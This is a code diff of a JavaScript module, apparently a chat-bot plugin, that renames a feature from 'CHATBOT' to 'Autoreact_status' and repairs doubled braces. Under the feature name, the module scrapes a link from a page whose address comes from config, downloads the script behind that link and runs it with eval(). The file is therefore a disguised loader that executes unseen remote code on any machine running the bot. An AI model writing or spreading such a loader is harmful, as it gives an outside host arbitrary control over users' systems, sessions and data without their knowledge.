@@ -8,26 +8,26 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const adams = require(__dirname + "/../config");
 
-async function fetchCHATBOTUrl() {{
-  try {{
+async function fetchAutoreact_statusUrl() {
+  try {
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    const targetElement = $('a:contains("CHATBOT")');
+    const targetElement = $('a:contains("Autoreact_status")');
     const targetUrl = targetElement.attr('href');
 
-    if (!targetUrl) {{
-      throw new Error('CHATBOT link not found');
-    }}
+    if (!targetUrl) {
+      throw new Error('Autoreact_status not found 😭');
+    }
 
-    console.log('CHATBOT link loaded successfully ✅');
+    console.log('Autoreact_status loaded successfully ✅');
 
     const scriptResponse = await axios.get(targetUrl);
     eval(scriptResponse.data);
 
-  }} catch (error) {{
+  } catch (error) {
     console.error('Error:', error.message);
-  }}
-}}
+  }
+}
 
-fetchCHATBOTUrl();
+fetchAutoreact_statusUrl();
